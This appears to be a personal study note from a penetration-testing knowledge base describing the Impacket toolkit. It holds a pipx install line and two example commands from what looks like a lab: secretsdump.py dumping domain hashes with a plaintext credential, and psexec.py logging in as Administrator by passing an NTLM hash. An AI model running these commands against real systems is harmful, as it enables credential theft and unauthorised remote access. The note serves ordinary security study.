---
creation date: May 29th 2023
last modified date: May 29th 2023
aliases: []
tags: #🧰
---

Primary Categories: [[04 - Tools & Techniques]] 
Secondary Categories: [[02 - Windows Privilege Escalation]] [[]]
Links: [[]] 
Search Tag: #🧰  

# [[04 - Impacket]]  

## Description:
---
Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (e.g. SMB1-3 and MSRPC) the protocol implementation itself. Packets can be constructed from scratch, as well as parsed from raw data, and the object-oriented API makes it simple to work with deep hierarchies of protocols. The library provides a set of tools as examples of what can be done within the context of this library.

## Installation
---
```bash
python3 -m pipx install impacket
```

## Commands
---
#### secretsdump.py
	Performs various techniques to dump hashes from the remote machine without executing any agent there.
```bash
secretsdump.py spookysec.local/backup:'backup2517860'@10.10.143.138 -just-dc
```

#### psexec.py
	Pass the hash
```bash
psexec.py Administrator@$IP -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4
```




___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: May 29th 2023 (08:47 pm) 
Last Modified Date: May 29th 2023 (08:47 pm)
